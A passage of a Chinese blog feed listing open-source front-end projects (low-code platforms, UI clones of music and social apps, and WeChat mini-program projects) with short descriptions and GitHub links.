srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 7.5k）：</strong><a href="https://github.com/alibaba/lowcode-engine">https://github.com/alibaba/lowcode-engine</a><br /><strong>4. form-generator</strong><br />Element UI 表单设计及代码生成器，可将生成的代码直接运行在基于 Element 的 vue 项目中；也可导出 JSON 表单，使用配套的解析器将 JSON 解析成真实的表单。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660228937914-fd98ba19-592f-4ffd-b963-391d7f7fd077.png?x-oss-process=image/resize,w_957,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660228937914-fd98ba19-592f-4ffd-b963-391d7f7fd077.png?x-oss-process=image/resize,w_957,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 6.8k）：</strong><a href="https://github.com/JakHuang/form-generator">https://github.com/JakHuang/form-generator</a><br /><strong>5. H5-Dooring&#x2F;pc-Dooring</strong><br />H5-Dooring 是一款功能强大、专业可靠的 H5 可视化页面配置解决方案，致力于提供一套简单方便、专业可靠、无限可能的 H5 落地页最佳实践。技术栈以 React 和 TypeScript 为主，后台采用 nodejs 开发。除了 H5 版，还提供了 PC 版。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660216377847-8c24c525-5a0a-4c45-abf7-fe9f4ed5e175.png?x-oss-process=image/resize,w_948,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660216377847-8c24c525-5a0a-4c45-abf7-fe9f4ed5e175.png?x-oss-process=image/resize,w_948,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（H5）（⭐️ 6.7k）：</strong><a href="https://github.com/MrXujiang/h5-Dooring">https://github.com/MrXujiang/h5-Dooring</a><br /><strong>Github（PC）（⭐️ 354）：</strong><a href="https://github.com/MrXujiang/pc-Dooring">https://github.com/MrXujiang/pc-Dooring</a><br /><strong>6. YAO</strong></p><p>Yao 是一款支持快速创建 Web 服务和管理后台的开源低代码应用引擎。只需使用 JSON 即可创建数据库模型、编写 API 接口、描述管理后台界面的低代码引擎，使用 Yao 构建的应用可运行在云端或物联网设备上。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660228687019-6e4a2cb3-dbea-4aba-9718-2e291433adf0.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660228687019-6e4a2cb3-dbea-4aba-9718-2e291433adf0.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 4.3k）：</strong><a href="https://github.com/YaoApp/yao">https://github.com/YaoApp/yao</a><br /><strong>7. Mometa</strong><br />mometa 不是传统主流的低代码平台，而是面向研发的、代码可视设计编辑平台；它更像是 dreamweaver、gui 可视编辑之于程序员。它的定位更多是基于程序员本地开发的模式，新增了可视化编码的能力。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660229007065-6b86bf28-c3b7-4d56-92a0-a222c671e7f6.png?x-oss-process=image/resize,w_955,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660229007065-6b86bf28-c3b7-4d56-92a0-a222c671e7f6.png?x-oss-process=image/resize,w_955,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 3.2k）：</strong><a href="https://github.com/imcuttle/mometa">https://github.com/imcuttle/mometa</a><br /><strong>8. NocoBase</strong><br />NocoBase 是一个极易扩展的开源无代码开发平台。 无需编程，使用 NocoBase 搭建自己的协作平台、管理系统，只需要几分钟时间。如果你有以下需求，NocoBase 就是为你设计的：<br />● 开发组织内部管理系统<br />● 通过无代码开发，满足大部分业务需求<br />● 无代码开发在操作上足够简单，满足非开发人员；在功能上足够灵活，接近原生开发<br />● 可以非常方便的进行扩展开发<br />● 私有部署，掌控全部代码和数据</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660216914006-c340a7fd-a8e6-4669-98f7-781988e48db7.png?x-oss-process=image/resize,w_991,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660216914006-c340a7fd-a8e6-4669-98f7-781988e48db7.png?x-oss-process=image/resize,w_991,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 2.9k）：</strong><a href="https://github.com/nocobase/nocobase">https://github.com/nocobase/nocobase</a><br /><strong>9. Sparrow</strong><br />sparrow 是一个场景化低代码（LowCode）搭建工作台，它的核心目标仅有一条“提升研发效率”，目前提供基于 Vue、Element-UI 组件库中后台项目的实践，实时输出源代码。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660229140986-bb79e2fb-e730-4eb8-bb7b-0ba7bf7fad47.png?x-oss-process=image/resize,w_874,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660229140986-bb79e2fb-e730-4eb8-bb7b-0ba7bf7fad47.png?x-oss-process=image/resize,w_874,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 2.7k）：</strong><a href="https://github.com/sparrow-js/sparrow">https://github.com/sparrow-js/sparrow</a><br /><strong>10. vite-vue3-lowcode</strong><br />vite-vue3-lowcode 是一个基于 Vite2.x + Vue3.x + TypeScript 的 H5 低代码平台。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660227904541-bc86a992-827d-4a08-b4e5-7228dbca14c7.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660227904541-bc86a992-827d-4a08-b4e5-7228dbca14c7.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 1.8k）：</strong><a href="https://github.com/buqiyuan/vite-vue3-lowcode">https://github.com/buqiyuan/vite-vue3-lowcode</a><br /><strong>11. 华炎魔方</strong><br />华炎魔方是 Salesforce 低代码平台的开源替代方案，使用可视化工具进行模型设计, 页面设计, 流程设计, 报表设计 ， 只需点击鼠标，就能快速创建应用程序，实现敏捷开发的新高度。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660228018138-7214cb69-eb50-44e2-9300-e840c9735f9c.png?x-oss-process=image/resize,w_829,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660228018138-7214cb69-eb50-44e2-9300-e840c9735f9c.png?x-oss-process=image/resize,w_829,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 805）：</strong><a href="https://github.com/steedos/steedos-platform">https://github.com/steedos/steedos-platform</a><br /><strong>12. Awesome Lowcode</strong><br />Awesome Lowcode 是国内低代码平台从业者交流项目，包含了国内外的一些低代码平台。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660228876332-6ea11481-125c-43be-bb2b-d86999686989.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660228876332-6ea11481-125c-43be-bb2b-d86999686989.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 8.5k）：</strong><a href="https://github.com/taowen/awesome-lowcode">https://github.com/taowen/awesome-lowcode</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 低代码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端高仿项目</title>
      <link href="/2023/06/30/frontend/collection/projects/qian-duan-gao-fang-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/qian-duan-gao-fang-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><strong>1. 高仿 QQ 音乐（Vue）</strong><br />一个使用 Vue3+TS 开发的音乐播放器，界面模仿 QQ 音乐 Mac 客户端，支持黑夜模式。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656938622784-74da657c-d845-408d-bf80-1a36ae598ff6.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656938622784-74da657c-d845-408d-bf80-1a36ae598ff6.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/SmallRuralDog/vue3-music">https://github.com/SmallRuralDog/vue3-music</a><br /><strong>2. 高仿网易云 Mac 客户端（Vue）</strong><br />一个基于 Vue2、Vue-CLI3 的高仿网易云 mac 客户端播放器（PC）。使用了 Vue 全家桶、Sass、better-scroll、ElementUI 等技术实现。</p><p>该项目实现了 mv 页、cd 页、搜索建议、搜索详情、播放、发现页、播放列表、播放记录、全部歌单、歌单详情、最新音乐、主题换肤功能、登录等功能。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656909926543-d4719358-fbbd-4bdf-8559-0500d4f140cf.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656909926543-d4719358-fbbd-4bdf-8559-0500d4f140cf.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/sl1673495/vue-netease-music">https://github.com/sl1673495/vue-netease-music</a><br /><strong>3. 高仿网易云 Mac 客户端（React）</strong><br />一个基于 React、TypeScript 的高仿网易云 mac 客户端播放器。使用 React Hook 做状态管理，没有使用额外的数据管理库。除此之外，还使用到了 CSS Modules、Webpack、Graphql 等技术。</p><p>该项目实现了登录&#x2F;登出、发现页、每日歌曲推荐页、全部歌单页、最新音乐页、歌单详情页、音乐播放详情页、播放记录、搜索、创建和收藏的歌单列表等功能。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656909465499-0809e4df-e4c4-4e45-982f-014dce9e97ad.png?x-oss-process=image/resize,w_960,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656909465499-0809e4df-e4c4-4e45-982f-014dce9e97ad.png?x-oss-process=image/resize,w_960,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/uniquemo/react-netease-music">https://github.com/uniquemo/react-netease-music</a><br /><strong>4. 高仿 B 站（React）</strong><br />高仿 B 站 web 移动端，基于此<a href="https://github.com/dxx/react-ssr">SSR 服务端渲染</a>模板，使用 React 16.8，Typescript 开发，后端服务使用 Express 实现。</p><p>该项目实现了首页、分类页、排行榜、搜索、视频详情页、 UP 主页、个人中心、直播、直播列表、分类、直播间等功能。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/1500604/1656909065232-0fdc989a-9002-4059-a17d-f700ca0d991e.jpeg?x-oss-process=image/resize,w_766,limit_0/interlace,1" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/jpeg/1500604/1656909065232-0fdc989a-9002-4059-a17d-f700ca0d991e.jpeg?x-oss-process=image/resize,w_766,limit_0/interlace,1" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/dxx/react-bilibili">https://github.com/dxx/react-bilibili</a><br /><strong>5. 高仿掘金（Vue）</strong><br />高仿掘金，整合 vue + nuxt + axios + vuex + vue-router (nuxt 自带 vuex 和 vue-router)，是一个基于 Nuxt 的服务器端渲染 Demo。</p><p>该项目实现了服务器端渲染、静态页面部署、掘金首页、掘金推荐列表、掘金小册、滚动分页加载、不同端的布局适配等功能。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1656909260989-35a72774-b69d-4f00-95a5-db1732c0fc61.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1656909260989-35a72774-b69d-4f00-95a5-db1732c0fc61.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/xuqiang521/nuxt-ssr-demo">https://github.com/xuqiang521/nuxt-ssr-demo</a><br /><strong>6. 高仿饿了么（Vue）</strong><br />一个基于 vue2 + vuex + vue-router + webpack + ES6&#x2F;7 + fetch + sass + flex + svg 构建的具有 45 个页面的仿饿了么的大型单页面应用，舒注册、登录、商品展示、购物车、下单等功能。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656936873473-0e51e023-5747-40fd-9dba-f4b3c921eeb6.png?x-oss-process=image/resize,w_398,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656936873473-0e51e023-5747-40fd-9dba-f4b3c921eeb6.png?x-oss-process=image/resize,w_398,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/bailicangdu/vue2-elm">https://github.com/bailicangdu/vue2-elm</a><br /><strong>7. 高仿微信（Vue ）</strong><br />一个基于 Vue.js2.0 高仿微信 App 的单页应用，使用 Vue.js2.0 框架，搭配样式库<a href="https://weui.io/">WeUI</a>，模仿微信 app 的样式和交互。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1656910095137-87a55a63-c06d-474b-990e-a6d3b954546c.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1656910095137-87a55a63-c06d-474b-990e-a6d3b954546c.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/zhaohaodang/vue-WeChat">https://github.com/zhaohaodang/vue-WeChat</a><br /><strong>8. 高仿 Instagram（React）</strong><br />一个仿 Instagram 项目，前端使用 React、状态管理使用 Redux、路由使用 React Router、表格管理使用 Formik、动画使用 React Spring、Websocket 管理使用 Socket.io、后端使用 Express、数据库使用 MongoDB。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656910578892-6d1cf891-df66-4d15-a6a4-9e89550c52de.png?x-oss-process=image/resize,w_883,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656910578892-6d1cf891-df66-4d15-a6a4-9e89550c52de.png?x-oss-process=image/resize,w_883,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/Sandermoen/instaclone">https://github.com/Sandermoen/instaclone</a><br /><strong>9. 高仿 Stackoverflow（React）</strong><br />这个项目是 Stackoverflow 的一个简化版的全栈克隆。使用 ReactJs、NextJs、Storybook、PostCSS、NodeJs、Express、MongoDB、Mongoose 等技术实现。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656910801831-4edef2f9-416f-43d3-b25b-4224a7be5157.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656910801831-4edef2f9-416f-43d3-b25b-4224a7be5157.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/salihozdemir/stackoverflow-clone">https://github.com/salihozdemir/stackoverflow-clone</a><br /><strong>10. 高仿 Spotify（React）</strong><br />一个 Spotify Web 播放器的前端克隆项目。使用 React (create-react-app CLI)、react-router-dom、axios 等技术实现。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656910949143-4ccb577d-fcaf-47d4-9e6b-6c77b1e88f4e.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656910949143-4ccb577d-fcaf-47d4-9e6b-6c77b1e88f4e.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Giuhub：</strong><a href="https://github.com/JL978/spotify-clone-client">https://github.com/JL978/spotify-clone-client</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 高仿 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序项目</title>
      <link href="/2023/06/30/frontend/collection/projects/wei-xin-xiao-cheng-xu-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/wei-xin-xiao-cheng-xu-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><strong>wechat-app-mall</strong><br /> wechat-app-mall 是一个微信小程序商城、微信小程序微店。其具有以下功能：<br />● 基于云接口及自动化后台管理，无需部署后台及服务器资源；<br />● 商品展示、单商品多规格配置单独的库存和价格；<br />● 基于小程序 Storage 接口的购物车功能；<br />● 订单管理；<br />● 小程序在线支付；<br />● 物流跟踪管理；</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662815739281-dc34fbb0-29e3-49d1-81d7-d287723936f4.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662815739281-dc34fbb0-29e3-49d1-81d7-d287723936f4.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 16.2k）：</strong><a href="https://github.com/EastWorld/wechat-app-mall">https://github.com/EastWorld/wechat-app-mall</a><br /><strong>vant-weapp</strong><br />Vant 是一个轻量、可靠的移动端组件库，于 2017 年开源。目前 Vant 官方提供了 <a href="https://vant-contrib.gitee.io/vant/v2">Vue 2 版本</a>、<a href="https://vant-contrib.gitee.io/vant">Vue 3 版本</a>和<a href="http://vant-contrib.gitee.io/vant-weapp">微信小程序版本</a>，并由社区团队维护 <a href="https://github.com/3lang3/react-vant">React 版本</a>和<a href="https://github.com/ant-move/Vant-Aliapp">支付宝小程序版本</a>。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662818768021-c3192620-276c-445a-bdc4-7393f4fe32ce.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662818768021-c3192620-276c-445a-bdc4-7393f4fe32ce.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 16.2k）：</strong><a href="https://github.com/vant-ui/vant-weapp">https://github.com/vant-ui/vant-weapp</a><br /><strong>iView Weapp</strong><br />iView Weapp 是一套高质量的微信小程序 UI 组件库。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662820006985-4c36c533-6ca2-4bbd-b9fa-2f98883508ae.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662820006985-4c36c533-6ca2-4bbd-b9fa-2f98883508ae.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 6.2k）：</strong><a href="https://github.com/TalkingData/iview-weapp">https://github.com/TalkingData/iview-weapp</a><br /><strong>echarts-for-weixin</strong><br />echarts-for-weixin 是 <a href="https://github.com/apache/incubator-echarts">Apache ECharts (incubating)</a> 的微信小程序版本，以及使用的示例。开发者可以通过熟悉的 ECharts 配置方式，快速开发图表，满足各种可视化需求。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662818180810-6f36d21b-4861-406a-84cf-bc1d802bb5bc.png?x-oss-process=image/resize,w_750,limit_0#from=url&id=pS9Ee&originHeight=500&originWidth=750&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662818180810-6f36d21b-4861-406a-84cf-bc1d802bb5bc.png?x-oss-process=image/resize,w_750,limit_0#from=url&id=pS9Ee&originHeight=500&originWidth=750&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 6k）：</strong><a href="https://github.com/ecomfe/echarts-for-weixin">https://github.com/ecomfe/echarts-for-weixin</a><br /><strong>Gitter</strong><br />Gitter for GitHub，可能是目前颜值最高的 GitHub 微信小程序客户端。该项目采用 <a href="https://taro.aotu.io/">Taro</a> 框架 + <a href="https://taro-ui.aotu.io/">Taro UI</a> 进行开发，小程序内数据均来自于 <a href="https://developer.github.com/v3/">GitHub Api v3</a>。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662816022676-f0c84f97-d92c-4597-bfb1-5d144fa9f01b.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662816022676-f0c84f97-d92c-4597-bfb1-5d144fa9f01b.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 3.6k）：</strong><a href="https://github.com/nslogx/Gitter">https://github.com/nslogx/Gitter</a><br /><strong>winxin-app-watch-life.net</strong><br />微慕小程序开源版-WordPress 版微信小程序，其支持分享朋友圈、微信小程序广告、文章海报、WordPress 相册、小程序直播、微信搜一搜页面接入和内容搜索、视频号、半屏打开小程序、订阅专题、页面的分享和转发、文章浏览数显示及更新、文章分、文章评论、文章排行等。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662817633215-022e8860-8882-4611-9a34-e154053ea008.png?x-oss-process=image/resize,w_840,limit_0#from=url&id=kgjO4&originHeight=331&originWidth=840&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662817633215-022e8860-8882-4611-9a34-e154053ea008.png?x-oss-process=image/resize,w_840,limit_0#from=url&id=kgjO4&originHeight=331&originWidth=840&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 2.3 k）：</strong><a href="https://github.com/iamxjb/winxin-app-watch-life.net">https://github.com/iamxjb/winxin-app-watch-life.net</a><br /><strong>Bee</strong><br />Bee 是一个餐饮点餐商城微信小程序，是针对餐饮行业推出的一套完整的餐饮解决方案，实现了用户在线点餐下单、外卖、叫号排队、支付、配送等功能，完美的使餐饮行业更高效便捷！</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662816470204-88052ef8-45a4-45ba-b406-9c06fb15b62d.png?x-oss-process=image/resize,w_750,limit_0#from=url&id=Nimdu&originHeight=500&originWidth=750&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662816470204-88052ef8-45a4-45ba-b406-9c06fb15b62d.png?x-oss-process=image/resize,w_750,limit_0#from=url&id=Nimdu&originHeight=500&originWidth=750&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 1k）：</strong><a href="https://github.com/woniudiancang/bee">https://github.com/woniudiancang/bee</a><br /><strong>taro-music</strong><br />taro-music 是 基于 taro + taro-ui + redux + react-hooks + typescript 开发的网易云音乐小程序，taro3 已升级完毕。通过这个项目也可以帮助你快速使用 Taro 开发一个属于你自己的小程序。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662817422126-f4384fdc-173a-4ac0-bcc5-690a5c5790a7.png?x-oss-process=image/resize,w_719,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662817422126-f4384fdc-173a-4ac0-bcc5-690a5c5790a7.png?x-oss-process=image/resize,w_719,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 1.3k）：</strong><a href="https://github.com/lsqy/taro-music">https://github.com/lsqy/taro-music</a><br /><strong>weapp-library</strong><br />weapp-library 是一个在线借书平台微信小程序，连接读者与图书馆的借书平台、读者的图书资料库与书单系统。30+ 页面，多个可复用组件，微信小程序开发入门。提供本地 mock server 解决方案。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662817201118-9d64a585-c14e-489c-aa31-fa9fd0b4490f.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662817201118-9d64a585-c14e-489c-aa31-fa9fd0b4490f.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 754）：</strong><a href="https://github.com/imageslr/weapp-library">https://github.com/imageslr/weapp-library</a><br /><strong>Garbage</strong><br />Garbage 是一个使用小程序云开发的垃圾分类小程序。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662819245320-8d77b76d-45e5-455c-bd40-992cd540c210.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662819245320-8d77b76d-45e5-455c-bd40-992cd540c210.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 736）：</strong><a href="https://github.com/qi19901212/Garbage">https://github.com/qi19901212/Garbage</a><br /><strong>wepy</strong><br />WePY 是一款让小程序支持组件化开发的框架，通过预编译的手段让开发者可以选择自己喜欢的开发风格去开发小程序。框架的细节优化，Promise，Async Functions 的引入都是为了能让开发小程序项目变得更加简单，高效。</p><p>其具有以下特性：<br />● 类 Vue 开发风格<br />● 支持自定义组件开发<br />● 支持引入 NPM 包<br />● 支持 Promise<br />● 支持 ES2015+ 特性，如 Async Functions<br />● 支持多种编译器，Less&#x2F;Sass&#x2F;Stylus&#x2F;PostCSS、Babel&#x2F;Typescript、Pug<br />● 支持多种插件处理，文件压缩，图片压缩，内容替换等<br />● 支持 Sourcemap，ESLint 等<br />● 小程序细节优化，如请求列队，事件优化等</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662821425314-7458e649-7a23-419d-8bed-6224088ba2f5.png?x-oss-process=image/resize,w_750,limit_0#from=url&id=vYdAD&originHeight=529&originWidth=750&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662821425314-7458e649-7a23-419d-8bed-6224088ba2f5.png?x-oss-process=image/resize,w_750,limit_0#from=url&id=vYdAD&originHeight=529&originWidth=750&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 21.9k）：</strong><a href="https://github.com/Tencent/wepy">https://github.com/Tencent/wepy</a><br /><strong>awesome-wechat-weapp</strong><br />微信小程序开发资源汇总，本项目收集了微信小程序开发过程中会使用到的资料、问题以及第三方组件库。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662819465650-b4f2ccf2-d251-41cf-8a3d-42a7a2374a4a.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1662819465650-b4f2ccf2-d251-41cf-8a3d-42a7a2374a4a.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 38.7k）：</strong><a href="https://github.com/justjavac/awesome-wechat-weapp">https://github.com/justjavac/awesome-wechat-weapp</a></p><p><strong>贝壳小盒子</strong><br />贝壳小盒子微信小程序，高校微信小程序，集课表查询、成绩查询、电费查询、图书查询等功能于一体。</p><p><img 